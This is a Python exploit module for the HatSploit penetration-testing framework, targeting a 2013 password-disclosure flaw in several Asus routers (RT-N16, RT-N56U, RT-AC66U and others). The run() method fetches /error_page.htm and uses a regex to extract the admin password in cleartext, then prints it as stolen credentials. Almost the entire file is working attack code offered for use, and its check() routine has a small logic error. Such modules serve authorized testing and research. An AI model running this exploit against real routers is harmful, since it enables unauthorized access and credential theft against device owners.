"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "Asus RT-N16 Password Disclosure",
            'Module': "exploit/linux/asus/rt_n16_password_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Harry Sintonen (piru) - vulnerability researcher",
            ],
            'Description': (
                "Asus RT-N16 router has a vulnerability exploitation of which "
                "leading to a specific user (admin) password disclosure."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "ASUS RT-N10U, firmware 3.0.0.4.374_168",
                "ASUS RT-N56U, firmware 3.0.0.4.374_979",
                "ASUS DSL-N55U, firmware 3.0.0.4.374_1397",
                "ASUS RT-AC66U, firmware 3.0.0.4.374_2050",
                "ASUS RT-N15U, firmware 3.0.0.4.374_16",
                "ASUS RT-N53, firmware 3.0.0.4.374_311"
            ],
            'References': [
                {'URL': 'https://sintonen.fi/advisories/asus-router-auth-bypass.txt'}
            ],
            'DisclosureDate': "2013-03-29",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.username = Option("admin", "Default username.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path='/error_page.htm'
        )

        if not response and response.status_code != 200:
            return False

        return True

    def run(self):
        response = self.http_request(
            method="GET",
            path='/error_page.htm'
        )

        creds = re.findall(
            r"if\('1' == '0' \|\| '(.+?)' == '" + self.username.value + r"'\)", response.text
        )

        if len(creds):
            password = creds[0]
            self.print_table(
                "Credentials", ('Username', 'Password'), (self.username.value, password)
            )
        else:
            self.print_warning(
                f"Target vulnerable, but default username is not {self.username.value}."
            )
